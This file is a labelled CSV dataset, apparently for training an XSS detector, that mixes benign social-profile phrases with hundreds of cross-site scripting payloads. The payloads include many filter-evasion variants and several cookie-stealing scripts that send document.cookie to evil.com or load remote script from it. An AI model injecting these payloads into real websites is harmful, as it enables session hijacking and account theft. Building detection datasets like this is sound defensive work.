input,label
Have a wonderful day,0
Check out my portfolio,0
Great work on the project!,0
Available for consultation,0
I love this website Great!,0
That sounds like a plan,0
';alert(1);//,1
I'm interested in your services,0
Have a safe trip Great!,0
<svg><script>alert(1)</script></svg>,1
<TABLE><TD BACKGROUND='javascript:alert(1)'>,1
Congratulations on your achievement,0
<IMG SRC=`javascript:alert('XSS')`>,1
Portfolio: www.example.com Perfect!,0
<script>eval('alert(1)')</script>,1
Thanks for your help Thanks!,0
I'll get back to you soon Thanks!,0
That sounds like a plan Awesome!,0
Specializing in web development Thanks!,0
Can you help me with this? Great!,0
<script>alert('XSS')</script>,1
That sounds like a plan 😊,0
Please send me details 😊,0
<script>alert('XSS')</script>,1
I'll get back to you soon Awesome!,0
Coffee time! ☕,0
Please visit https://example.com for more info Perfect!,0
<IMG SRC=javascript:alert('XSS')>,1
"<script>localStorage.setItem('xss','stored')</script>",1
That sounds like a plan,0
Have a wonderful day Thanks!,0
My favorite color is blue,0
The meeting is scheduled for 3 PM Awesome!,0
<script>alert('XSS')</script>,1
Coffee time! ☕,0
<DIV STYLE='width: expression(alert(1))'>,1
Thanks for your help Perfect!,0
I'll get back to you soon Awesome!,0
Enjoy your weekend,0
Looking forward to hearing from you Thanks!,0
Based in New York,0
I'll get back to you soon,0
\x3cscript\x3ealert('XSS')\x3c/script\x3e,1
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>,1
<img src='x' onerror='&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;'>,1
Looking forward to hearing from you,0
Based in New York Thanks!,0
\x3cscript\x3ealert('XSS')\x3c/script\x3e,1
I agree with your point,0
Have a safe trip,0
I appreciate your time,0
<svg><script>alert(1)</script></svg>,1
<script>alert(1)</script>,1
Please visit https://example.com for more info,0
<img src=x onerror=\u0061lert(1)>,1
<style>@import'javascript:alert(1)';</style>,1
<img src='javascript:alert(1)'>,1
I'm interested in your services,0
Thanks for your help,0
<a href='javascript:alert(1)'>click</a>,1
Call me at 555-1234,0
<STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>,1
Have a safe trip,0
<audio src=1 onerror=alert(1)>,1
See you tomorrow,0
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
My name is John Doe,0
<base href='javascript:alert(1)//>,1
<img src='x' onerror='alert(document.domain)'>,1
<style>@import'javascript:alert(1)';</style>,1
<BODY BACKGROUND='javascript:alert(1)'>,1
<img src=x onerror=alert('XSS')>,1
javascript:alert('XSS'),1
javascript:alert('XSS'),1
I love this website,0
I love this website,0
<DIV STYLE='background-image: url(javascript:alert(1))'>,1
<marquee onstart=alert('XSS')>,1
I love this website,0
Contact me at email@example.com,0
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>,1
"<iframe src='data:text/html,<script>alert(1)</script>'>",1
<select onfocus=alert('XSS') autofocus>,1
Looking forward to hearing from you,0
I work as a software engineer Awesome!,0
Great job everyone,0
I agree with your point Awesome!,0
<script>var i=new Image;i.src='http://evil.com/?'+document.cookie;</script>,1
"""><script>alert(1)</script>",1
Coffee time! ☕ 👍,0
<details open ontoggle=alert(1)>,1
I appreciate your time Great!,0
Thanks for sharing,0
<BODY ONUNLOAD='alert(1)'>,1
I'm interested in your services,0
Call me at 555-1234,0
<svg/onload=alert(1)>,1
I love this website,0
Just finished my workout,0
"<script>localStorage.setItem('xss','stored')</script>",1
';alert(1);//,1
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
<img src='x' onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
Welcome to my profile! Great!,0
<script>alert('XSS')</script>,1
<script><!--alert(1)--></script>,1
Thanks for sharing Perfect!,0
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>,1
<script>window.location='http://evil.com'</script>,1
I agree with your point,0
"Hello, how are you?",0
<isindex type=image src=1 onerror=alert(1)>,1
Nice to meet you,0
<IMG STYLE='xss:expr/*XSS*/ession(alert(1))'>,1
<script>var i=new Image;i.src='http://evil.com/?'+document.cookie;</script>,1
<marquee onstart=alert('XSS')>,1
<svg onload=alert('XSS')>,1
Portfolio: www.example.com,0
<BGSOUND SRC='javascript:alert(1)'>,1
Coffee time! ☕,0
Congratulations on your achievement,0
"""><script>alert(1)</script>",1
<BODY BACKGROUND='javascript:alert(1)'>,1
Portfolio: www.example.com Awesome!,0
<img src=x onerror=alert(1)>,1
Great work on the project!,0
<TABLE><TD BACKGROUND='javascript:alert(1)'>,1
My favorite color is blue Awesome!,0
<embed code='javascript:alert(1)'>,1
Have a safe trip,0
<script><!--alert(1)--></script>,1
I'd like to learn more Awesome!,0
I'd like to learn more,0
%3Cscript%3Ealert('XSS')%3C/script%3E,1
Count me in!,0
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
<IMG LOWSRC='javascript:alert(1)'>,1
"<script>sessionStorage.setItem('xss','stored')</script>",1
<div onmouseover=alert('XSS')>hover me</div>,1
"Hello, how are you?",0
Have a safe trip,0
"<embed src='data:text/html,<script>alert(1)</script>'>",1
<marquee onfinish=alert(1)>,1
<scr\x00ipt>alert('XSS')</scr\x00ipt>,1
Sounds interesting,0
This is a great product,0
Best regards,0
"<iframe src='data:text/html,<script>alert(1)</script>'>",1
Nice to meet you 👍,0
That sounds like a plan,0
The meeting is scheduled for 3 PM,0
<style>@import'javascript:alert(1)';</style>,1
Enjoy your weekend 👍,0
Great work on the project!,0
<iframe src='javas&#99;ript:alert(1)'>,1
Portfolio: www.example.com,0
<LINK REL='stylesheet' HREF='javascript:alert(1)'>,1
<img src=x onerror=\u0061lert(1)>,1
My favorite color is blue,0
<BODY ONLOAD=alert(1)>,1
<IMG SRC=javascript:alert('XSS')>,1
<form action='javascript:alert(1)'><input type='submit'></form>,1
This is very helpful,0
Can you help me with this?,0
Call me at 555-1234,0
10 years of experience,0
Nice to meet you,0
<scr\x00ipt>alert('XSS')</scr\x00ipt>,1
<script>/*alert(1)*/</script>,1
Specializing in web development,0
<BR SIZE='&{alert(1)}'>,1
';alert(1);//,1
Best regards,0
Thanks for your help,0
Portfolio: www.example.com Thanks!,0
<script>var i=new Image;i.src='http://evil.com/?'+document.cookie;</script>,1
<embed code='javascript:alert(1)'>,1
<math><mi xlink:href='javascript:alert(1)'>click</mi></math>,1
Reading a great book,0
Welcome to my profile!,0
<input onfocus=alert('XSS') autofocus>,1
\u003cscript\u003ealert('XSS')\u003c/script\u003e,1
Can you help me with this?,0
Available for consultation,0
Count me in!,0
Enjoy your weekend Perfect!,0
<STYLE>.XSS{background-image:url('javascript:alert(1)');}</STYLE>,1
<img src='javascript:alert(1)'>,1
I agree with your point,0
<iframe src=javascript:alert('XSS')>,1
Great work on the project! Perfect!,0
<LINK REL='stylesheet' HREF='javascript:alert(1)'>,1
<STYLE>.XSS{background-image:url('javascript:alert(1)');}</STYLE>,1
<img src=x onerror=alert(1)>,1
I appreciate your time,0
Looking good! Thanks!,0
Specializing in web development,0
<XSS STYLE='xss:expression(alert(1))'>,1
<LINK REL='stylesheet' HREF='javascript:alert(1)'>,1
Have a safe trip,0
"<object data='data:text/html,<script>alert(1)</script>'>",1
'-alert(1)-',1
"Hello, how are you?",0
That's an interesting perspective,0
10 years of experience,0
I work as a software engineer,0
I'd like to learn more,0
Count me in! Awesome!,0
That sounds like a plan,0
Can you help me with this? Thanks!,0
My name is John Doe,0
Best regards,0
I'll get back to you soon,0
<iframe src=j&#97;vascript:alert(1)>,1
<script>window.location='http://evil.com'</script>,1
Count me in!,0
"<script>sessionStorage.setItem('xss','stored')</script>",1
Congratulations on your achievement,0
Welcome to my profile!,0
<style>@import'javascript:alert(1)';</style>,1
Sounds interesting,0
That's an interesting perspective,0
<form action='javascript:alert(1)'><input type='submit'></form>,1
I love this website,0
Count me in!,0
Contact me at email@example.com 😊,0
<script>eval('alert(1)')</script>,1
<input type='image' src=1 onerror=alert(1)>,1
Count me in!,0
<div onmouseover=alert('XSS')>hover me</div>,1
<BODY ONUNLOAD='alert(1)'>,1
Happy birthday! 🎉,0
Reading a great book,0
<body onload=alert('XSS')>,1
Best regards 😊,0
"<img src='x' onerror='eval(atob(""YWxlcnQoMSk=""))'>",1
<svg/onload=alert(1)>,1
<svg><animate onbegin=alert(1) attributeName=x>,1
<STYLE>.XSS{background-image:url('javascript:alert(1)');}</STYLE>,1
<BR SIZE='&{alert(1)}'>,1
<FRAMESET ONLOAD=alert(1)>,1
Enjoy your weekend Great!,0
<TABLE><TD BACKGROUND='javascript:alert(1)'>,1
My name is John Doe,0
<DIV STYLE='width: expression(alert(1))'>,1
Sounds interesting,0
Have a wonderful day 👍,0
<iframe src=javascript:alert('XSS')>,1
<style>@import'javascript:alert(1)';</style>,1
<a href='javascript:alert(1)'>click</a>,1
<script><!--alert(1)--></script>,1
Thanks for sharing Perfect!,0
Keep up the good work,0
I agree with your point,0
Keep up the good work,0
<script>new Image().src='http://evil.com/log?'+document.cookie</script>,1
'-alert(1)-',1
<DIV STYLE='background-image: url(javascript:alert(1))'>,1
Congratulations on your achievement Great!,0
<input onfocus=alert('XSS') autofocus>,1
<svg onload=alert('XSS')>,1
Can you help me with this?,0
That sounds like a plan,0
Have a safe trip Perfect!,0
See you tomorrow,0
Great work on the project!,0
Available for consultation Awesome!,0
<select onfocus=alert('XSS') autofocus>,1
<marquee onstart=alert('XSS')>,1
<body onload=alert('XSS')>,1
"Hello, how are you?",0
<body onload=alert('XSS')>,1
<object data='javascript:alert(1)'>,1
That sounds like a plan,0
Great work on the project!,0
Looking good! Perfect!,0
'-alert(1)-',1
The meeting is scheduled for 3 PM,0
<div onmouseover=alert('XSS')>hover me</div>,1
Let me know if you need anything,0
"<script>sessionStorage.setItem('xss','stored')</script>",1
<marquee loop=1 onfinish=alert(1)>,1
<BODY ONLOAD=alert(1)>,1
<a href='javascript:alert(1)'>click</a>,1
Happy birthday! 🎉 Perfect!,0
Great work on the project!,0
<IMG LOWSRC='javascript:alert(1)'>,1
<scr<script>ipt>alert(1)</scr</script>ipt>,1
I'd like to learn more,0
<?xml version='1.0'?><script>alert(1)</script>,1
Welcome to my profile! Great!,0
Can you help me with this? Thanks!,0
<img src=1 href=1 onerror='javascript:alert(1)'>,1
I'd like to learn more,0
<DIV STYLE='background-image: url(javascript:alert(1))'>,1
Looking forward to hearing from you,0
<input onfocus=alert('XSS') autofocus>,1
Based in New York Awesome!,0
<input onfocus=alert('XSS') autofocus>,1
Portfolio: www.example.com,0
<a href='javascript:alert(1)'>click</a>,1
This is a great product,0
<details open ontoggle=alert(1)>,1
Best regards,0
<script>alert(document.cookie)</script>,1
<IMG STYLE='xss:expr/*XSS*/ession(alert(1))'>,1
Check out my portfolio,0
<HTML xmlns:xss><?import namespace='xss' implementation='http://evil.com/xss.htc'><xss:xss>XSS</xss:xss></HTML>,1
<IMG SRC=`javascript:alert('XSS')`>,1
Coffee time! ☕,0
Just finished my workout,0
Specializing in web development,0
Enjoy your weekend Thanks!,0
<scr<script>ipt>alert(1)</scr</script>ipt>,1
<div onmouseover=alert('XSS')>hover me</div>,1
"<embed src='data:text/html,<script>alert(1)</script>'>",1
<script>eval('alert(1)')</script>,1
Please send me details Great!,0
<input type='image' src=1 onerror=alert(1)>,1
<script><!--alert(1)--></script>,1
<BODY BACKGROUND='javascript:alert(1)'>,1
<script>window.location='http://evil.com'</script>,1
I'd like to learn more Awesome!,0
<script>/*alert(1)*/</script>,1
<script>eval('alert(1)')</script>,1
I'd like to learn more,0
I'd like to learn more,0
Enjoy your weekend 👍,0
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
Keep up the good work Great!,0
I'll get back to you soon,0
<select onfocus=alert('XSS') autofocus>,1
<video src=1 onerror=alert(1)>,1
Looking good! Perfect!,0
Great job everyone,0
Looking forward to hearing from you Great!,0
That sounds like a plan,0
<IMG SRC=javascript:alert('XSS')>,1
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
<BR SIZE='&{alert(1)}'>,1
<script>alert(document.cookie)</script>,1
<input onfocus=alert('XSS') autofocus>,1
<marquee onstart=alert('XSS')>,1
Looking good!,0
<img src=x onerror=alert('XSS')>,1
Welcome to my profile!,0
Enjoy your weekend,0
I appreciate your time Thanks!,0
Happy birthday! 🎉,0
Thanks for your help,0
<marquee onstart=alert('XSS')>,1
Let me know if you need anything,0
Happy birthday! 🎉,0
<textarea onfocus=alert('XSS') autofocus>,1
"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",1
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
Call me at 555-1234,0
Count me in!,0
<SCRipT>alert(1)</SCRipT>,1
I'll get back to you soon,0
Count me in!,0
<div onmouseover=alert('XSS')>hover me</div>,1
\u003cscript\u003ealert('XSS')\u003c/script\u003e,1
The meeting is scheduled for 3 PM 👍,0
<select onfocus=alert('XSS') autofocus>,1
<DIV STYLE='background-image: url(javascript:alert(1))'>,1
"<embed src='data:text/html,<script>alert(1)</script>'>",1
<script>new Image().src='http://evil.com/log?'+document.cookie</script>,1
&#60;script&#62;alert('XSS')&#60;/script&#62;,1
10 years of experience,0
What a beautiful day 😊,0
Reading a great book Great!,0
<img src=x onerror=alert('XSS')>,1
<img src=x:alert(alt) onerror=eval(src) alt=xss>,1
<img src=x:alert(alt) onerror=eval(src) alt=xss>,1
<TABLE><TD BACKGROUND='javascript:alert(1)'>,1
My favorite color is blue Awesome!,0
I agree with your point,0
That's an interesting perspective,0
I agree with your point,0
Portfolio: www.example.com Perfect!,0
Welcome to my profile! Great!,0
<TABLE BACKGROUND='javascript:alert(1)'>,1
<form action='javascript:alert(1)'><input type='submit'></form>,1
<BR SIZE='&{alert(1)}'>,1
Portfolio: www.example.com Thanks!,0
<details open ontoggle=alert(1)>,1
Best regards Awesome!,0
Great job everyone,0
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
Best regards Thanks!,0
Count me in!,0
Keep up the good work,0
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
Sounds interesting 👍,0
This is a great product,0
Contact me at email@example.com,0
Can you help me with this?,0
Can you help me with this?,0
This is very helpful,0
<iframe src=j&#97;vascript:alert(1)>,1
<STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>,1
Based in New York,0
<script>/*alert(1)*/</script>,1
<body onload=alert('XSS')>,1
<iframe src='javas&#99;ript:alert(1)'>,1
<video src=1 onerror=alert(1)>,1
That's an interesting perspective,0
Great job everyone,0
<img src=1 href=1 onerror='javascript:alert(1)'>,1
Based in New York,0
My favorite color is blue,0
Congratulations on your achievement,0
10 years of experience,0
Have a wonderful day Thanks!,0
Just finished my workout,0
Welcome to my profile!,0
That sounds like a plan 👍,0
Specializing in web development Great!,0
"<embed src='data:text/html,<script>alert(1)</script>'>",1
This is very helpful,0
<base href='javascript:alert(1)//>,1
<script>eval('alert(1)')</script>,1
<a href='javascript:alert(1)'>click</a>,1
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
That sounds like a plan,0
<script>/*alert(1)*/</script>,1
<scr<script>ipt>alert(1)</scr</script>ipt>,1
10 years of experience Perfect!,0
<textarea onfocus=alert('XSS') autofocus>,1
<IMG SRC=javascript:alert('XSS')>,1
<video src=1 onerror=alert(1)>,1
<script><!--alert(1)--></script>,1
<DIV STYLE='width: expression(alert(1))'>,1
Have a wonderful day 👍,0
<img src=x onerror=\u0061lert(1)>,1
Sounds interesting,0
10 years of experience Perfect!,0
Thanks for sharing,0
<svg><script>alert&#40;1&#41;</script></svg>,1
<isindex type=image src=1 onerror=alert(1)>,1
Great job everyone,0
Specializing in web development,0
Have a safe trip,0
Just finished my workout,0
Welcome to my profile!,0
Welcome to my profile!,0
That's an interesting perspective Perfect!,0
Count me in!,0
"<script>sessionStorage.setItem('xss','stored')</script>",1
<body onload=alert('XSS')>,1
My name is John Doe,0
<DIV STYLE='background-image: url(javascript:alert(1))'>,1
My favorite color is blue,0
<marquee loop=1 onfinish=alert(1)>,1
"Hello, how are you? 👍",0
Coffee time! ☕,0
\x3cscript\x3ealert('XSS')\x3c/script\x3e,1
<details open ontoggle=alert(1)>,1
Just finished my workout Awesome!,0
Have a wonderful day Perfect!,0
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
<IMG STYLE='xss:expr/*XSS*/ession(alert(1))'>,1
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
The meeting is scheduled for 3 PM,0
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
Great job everyone,0
<svg onload=alert('XSS')>,1
"<script>localStorage.setItem('xss','stored')</script>",1
'-alert(1)-',1
<video src=1 onerror=alert(1)>,1
Portfolio: www.example.com,0
That sounds like a plan,0
Looking good! 👍,0
<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,1
Contact me at email@example.com,0
&#60;script&#62;alert('XSS')&#60;/script&#62;,1
10 years of experience,0
Please send me details Awesome!,0
Have a wonderful day,0
That sounds like a plan,0
'-alert(1)-',1
Keep up the good work,0
<BGSOUND SRC='javascript:alert(1)'>,1
"<script>sessionStorage.setItem('xss','stored')</script>",1
\u003cscript\u003ealert('XSS')\u003c/script\u003e,1
What a beautiful day Awesome!,0
<input onfocus=alert('XSS') autofocus>,1
That sounds like a plan 👍,0
Check out my portfolio,0
<TABLE><TD BACKGROUND='javascript:alert(1)'>,1
Check out my portfolio,0
Best regards,0
Have a safe trip Great!,0
<textarea onfocus=alert('XSS') autofocus>,1
<BR SIZE='&{alert(1)}'>,1
<math><mi xlink:href='javascript:alert(1)'>click</mi></math>,1
That sounds like a plan Perfect!,0
Looking good!,0
<style>@import'javascript:alert(1)';</style>,1
"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",1
<img src=x onerror=alert('XSS')>,1
<video src=1 onerror=alert(1)>,1
Please send me details Thanks!,0
The meeting is scheduled for 3 PM Great!,0
<SCRipT>alert(1)</SCRipT>,1
<svg><script>alert(1)</script></svg>,1
<a href='javascript:alert(1)'>click</a>,1
Happy birthday! 🎉,0
I'll get back to you soon 😊,0
Based in New York,0
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
Looking good! 😊,0
I appreciate your time,0
Looking forward to hearing from you,0
Great work on the project!,0
Let me know if you need anything 😊,0
I'd like to learn more Great!,0
<IMG SRC=javascript:alert('XSS')>,1
"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",1
';alert(1);//,1
This is a great product,0
That's an interesting perspective,0
<script>var i=new Image;i.src='http://evil.com/?'+document.cookie;</script>,1
I'll get back to you soon,0
Happy birthday! 🎉 Thanks!,0
Just finished my workout 😊,0
<script>eval('alert(1)')</script>,1
My name is John Doe,0
<HTML xmlns:xss><?import namespace='xss' implementation='http://evil.com/xss.htc'><xss:xss>XSS</xss:xss></HTML>,1
Looking good!,0
Best regards,0
I work as a software engineer Perfect!,0
My favorite color is blue,0
<DIV STYLE='width: expression(alert(1))'>,1
<body onload=alert('XSS')>,1
<BGSOUND SRC='javascript:alert(1)'>,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
Sounds interesting,0
<style>@import'javascript:alert(1)';</style>,1
<script>eval('alert(1)')</script>,1
\x3cscript\x3ealert('XSS')\x3c/script\x3e,1
Have a wonderful day,0
<input onfocus=alert('XSS') autofocus>,1
<textarea onfocus=alert('XSS') autofocus>,1
Have a safe trip,0
<script>/*alert(1)*/</script>,1
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
<img src=1 href=1 onerror='javascript:alert(1)'>,1
<TABLE><TD BACKGROUND='javascript:alert(1)'>,1
That's an interesting perspective Awesome!,0
Can you help me with this? Perfect!,0
Check out my portfolio,0
<script>new Image().src='http://evil.com/log?'+document.cookie</script>,1
Let me know if you need anything,0
I appreciate your time,0
<img src=1 href=1 onerror='javascript:alert(1)'>,1
I love this website,0
Available for consultation,0
<svg onload=alert('XSS')>,1
<script>document.write('<img src=x onerror=alert(1)>')</script>,1
<a href='javascript:alert(1)'>click</a>,1
That sounds like a plan,0
<object data='javascript:alert(1)'>,1
"""><script>alert(1)</script>",1
I'm interested in your services Perfect!,0
I love this website,0
Looking forward to hearing from you,0
Welcome to my profile!,0
That's an interesting perspective Perfect!,0
Based in New York Perfect!,0
Happy birthday! 🎉 Perfect!,0
See you tomorrow,0
Contact me at email@example.com,0
See you tomorrow Awesome!,0
<svg><script>alert&#40;1&#41;</script></svg>,1
This is a great product,0
<LINK REL='stylesheet' HREF='javascript:alert(1)'>,1
Contact me at email@example.com,0
<input type='image' src=1 onerror=alert(1)>,1
Contact me at email@example.com Perfect!,0
<marquee onfinish=alert(1)>,1
<script>var i=new Image;i.src='http://evil.com/?'+document.cookie;</script>,1
Congratulations on your achievement,0
Just finished my workout 😊,0
"""><script>alert(1)</script>",1
My favorite color is blue,0
Based in New York,0
Have a wonderful day,0
<math><mi xlink:href='javascript:alert(1)'>click</mi></math>,1
"<iframe src='data:text/html,<script>alert(1)</script>'>",1
Call me at 555-1234 👍,0
"<script>localStorage.setItem('xss','stored')</script>",1
Let me know if you need anything Awesome!,0
My favorite color is blue,0
<image src='javascript:alert(1)'>,1
"<embed src='data:text/html,<script>alert(1)</script>'>",1
My favorite color is blue,0
"<embed src='data:text/html,<script>alert(1)</script>'>",1
<STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>,1
<script>fetch('http://evil.com?cookie='+document.cookie)</script>,1
<img src='x' onerror='alert(document.domain)'>,1
Happy birthday! 🎉 👍,0
Reading a great book,0
&#60;script&#62;alert('XSS')&#60;/script&#62;,1
<TABLE BACKGROUND='javascript:alert(1)'>,1
<IMG SRC=`javascript:alert('XSS')`>,1
I appreciate your time,0
Please send me details,0
<HTML xmlns:xss><?import namespace='xss' implementation='http://evil.com/xss.htc'><xss:xss>XSS</xss:xss></HTML>,1
Can you help me with this? Perfect!,0
Call me at 555-1234,0
<form action='javascript:alert(1)'><input type='submit'></form>,1
<audio src=1 onerror=alert(1)>,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
<BR SIZE='&{alert(1)}'>,1
<math><mi xlink:href='javascript:alert(1)'>click</mi></math>,1
Sounds interesting,0
Have a safe trip 👍,0
Thanks for sharing,0
<script>new Image().src='http://evil.com/log?'+document.cookie</script>,1
That's an interesting perspective Thanks!,0
<LINK REL='stylesheet' HREF='javascript:alert(1)'>,1
<SCRipT>alert(1)</SCRipT>,1
Happy birthday! 🎉 Perfect!,0
Happy birthday! 🎉 😊,0
<script src='http://evil.com/xss.js'></script>,1
Looking forward to hearing from you,0
&#60;script&#62;alert('XSS')&#60;/script&#62;,1
<img src='x' onerror='&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;'>,1
<IMG DYNSRC='javascript:alert(1)'>,1
<script>document.write('<img src=x onerror=alert(1)>')</script>,1
My name is John Doe,0
Based in New York,0
<style>@import'javascript:alert(1)';</style>,1
"<object data='data:text/html,<script>alert(1)</script>'>",1
Best regards 👍,0
Let me know if you need anything,0
<input type='image' src=1 onerror=alert(1)>,1
Looking good!,0
<STYLE>.XSS{background-image:url('javascript:alert(1)');}</STYLE>,1
<iframe src=javascript:alert('XSS')>,1
<embed code='javascript:alert(1)'>,1
<details open ontoggle=alert(1)>,1
Portfolio: www.example.com,0
My favorite color is blue,0
<body onload=alert('XSS')>,1
Call me at 555-1234,0
Sounds interesting,0
<img src='javascript:alert(1)'>,1
<select onfocus=alert('XSS') autofocus>,1
<form action='javascript:alert(1)'><input type='submit'></form>,1
I agree with your point Great!,0
\x3cscript\x3ealert('XSS')\x3c/script\x3e,1
<BODY BACKGROUND='javascript:alert(1)'>,1
My name is John Doe,0
<script>alert('XSS')</script>,1
Thank you for your feedback 👍,0
Available for consultation,0
The meeting is scheduled for 3 PM,0
See you tomorrow,0
<script>document.write('<img src=x onerror=alert(1)>')</script>,1
I'd like to learn more,0
My name is John Doe,0
Welcome to my profile!,0
Contact me at email@example.com Perfect!,0
<math><mi xlink:href='javascript:alert(1)'>click</mi></math>,1
<DIV STYLE='width: expression(alert(1))'>,1
I appreciate your time 😊,0
Please send me details Great!,0
Contact me at email@example.com Perfect!,0
<marquee loop=1 onfinish=alert(1)>,1
Please visit https://example.com for more info,0
<script>alert('XSS')</script>,1
"<iframe src='data:text/html,<script>alert(1)</script>'>",1
Best regards Great!,0
Just finished my workout Thanks!,0
